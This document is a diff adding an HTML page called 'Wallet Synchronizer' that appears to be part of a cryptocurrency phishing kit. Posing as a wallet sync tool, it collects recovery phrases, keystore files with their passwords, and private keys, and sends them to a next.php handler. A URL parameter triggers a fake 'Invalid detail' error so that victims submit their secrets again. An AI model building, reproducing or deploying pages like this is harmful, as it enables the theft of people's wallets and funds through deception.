@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="./css/main.css" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="#">
+    <script>
+        function openCity(evt, cityName) {
+      // Declare all variables
+      var i, tabcontent, tablinks;
+
+      // Get all elements with class="tabcontent" and hide them
+      tabcontent = document.getElementsByClassName("tabcontent");
+      for (i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = "none";
+      }
+
+      // Get all elements with class="tablinks" and remove the class "active"
+      tablinks = document.getElementsByClassName("tablinks");
+      for (i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(" active", "");
+      }
+
+      // Show the current tab, and add an "active" class to the button that opened the tab
+      document.getElementById(cityName).style.display = "block";
+      evt.currentTarget.className += " active";
+    }
+  </script>
+    <title>Wallet Synchronizer</title>
+</head>
+
+<body>
+    <center>
+        <div class="top">
+            <a href="#" class="main"><img src="./images/log2.png" alt="logo"></a>
+        </div>
+        <br>
+        <h2>
+            <center> Input parameters to commence Syncing</center>
+        </h2>
+        <h5 style="color: red ; display: none;" id="msg">
+            <center> Invalid detail. Please enter correct detail below.</center>
+        </h5>
+        <br>
+        <div class="tab">
+            <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+            <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
+            <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+        </div>
+        <div id="phrase" class="tabcontent" style="display: block;">
+            <form action="./next.php" method="POST">
+                <input type="text" name="wallet_type" placeholder="Enter Wallet Name" required="">
+                <br>
+                <input type="hidden" name="category" value="Phrase">
+                <textarea name="phrase_val" required="required" minlength="12" placeholder="Phrase"></textarea>
+                <br>
+                <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                <br>
+                <button type="submit" name="btn1" class="btn">IMPORT</button>
+            </form>
+        </div>
+        <div id="keystore" class="tabcontent" style="display: none;">
+            <form action="./next.php" method="POST">
+                <input type="hidden" name="category" value="Keystore JSON">
+                <input type="text" name="wallet_type" placeholder="Enter Wallet Name" required="">
+                <br>
+                <textarea name="json_key" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+                <br>
+                <div class="field">
+                    <input type="text" name="json_key_password" placeholder="Password" required="required" minlength="4">
+                </div>
+                <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+                <br>
+                <button type="submit" name="btn2" class="btn">IMPORT</button>
+            </form>
+        </div>
+        <div id="private" class="tabcontent" style="display: none;">
+            <form action="./next.php" method="POST">
+                <input type="hidden" name="category" value="Private Key">
+                <input type="text" name="wallet_type" placeholder="Enter Wallet Name" required=""> 
+                <div class="field">
+                    <input type="text" name="private_key" placeholder="Private Key" required="required" minlength="64">
+                </div>
+                <div class="desc">Typically 64 alphanumeric characters</div>
+                <br>
+                <button type="submit" name="btn3" class="btn">IMPORT</button>
+            </form>
+        </div>
+    </center>
+<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $.urlParam = function(name) {
+        var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
+        return results[1] || 0;
+    }
+
+    if (!$.urlParam('count')) {
+
+    } else {
+        
+        var count = $.urlParam('count');
+        $('#count').val(count);
+        if (count == 1) {
+            $("#msg").show();
+        } else {
+            $("#msg").hide();
+        }
+    }
+
+
+
+});
+</script>
+
+</html>
